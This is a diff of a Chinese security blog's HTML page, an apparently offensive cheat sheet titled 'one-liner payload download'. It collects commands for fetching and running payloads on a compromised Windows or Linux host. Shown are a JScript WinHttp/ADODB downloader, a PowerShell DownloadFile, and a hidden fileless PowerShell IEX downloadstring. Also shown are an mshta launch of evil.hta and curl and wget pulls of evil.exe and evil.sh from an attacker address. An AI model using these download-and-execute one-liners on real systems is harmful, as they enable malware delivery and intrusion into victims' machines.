@@ -6,17 +6,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript.A">
+    <meta name="description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一句话下载payload（持续更新）">
 <meta property="og:url" content="https://godzeo.github.io/2020/04/24/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript.A">
+<meta property="og:description" content="js一句话下载payloadwindows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。 12345678var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);WinHttpReq.Open(&quot;GET&quot;, WScript">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-04-24T05:24:07.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.210Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:05.027Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="二进制">
@@ -54,6 +55,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -162,14 +165,27 @@
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
 
+
+
 <p>js一句话下载payload<br>windows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">​</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">​</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\test&gt;cscript &#x2F;nologo dowfile2.js http:&#x2F;&#x2F;192.168.1.1&#x2F;eval.exe</span><br></pre></td></tr></table></figure>
+
 <p>还有最简单的powershell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&#39;,&#39;E:\robots.txt&#39;)</span><br></pre></td></tr></table></figure>
 
+<p>远程执行命令，且无文件落地：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.174.1:1234/evil.txt'))"</span></span><br></pre></td></tr></table></figure>
 
+<p>远程目标主机上执行以下命令实现下载执行操作，且无文件落地：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://192.168.174.1:1234/evil.hta</span><br></pre></td></tr></table></figure>
+
+<p>curl</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.174.1:1234/evil.exe -o evil.exe</span><br></pre></td></tr></table></figure>
+
+<p>wget</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.174.1:1234/evil.sh</span><br></pre></td></tr></table></figure>
   </div>
 </article>
 
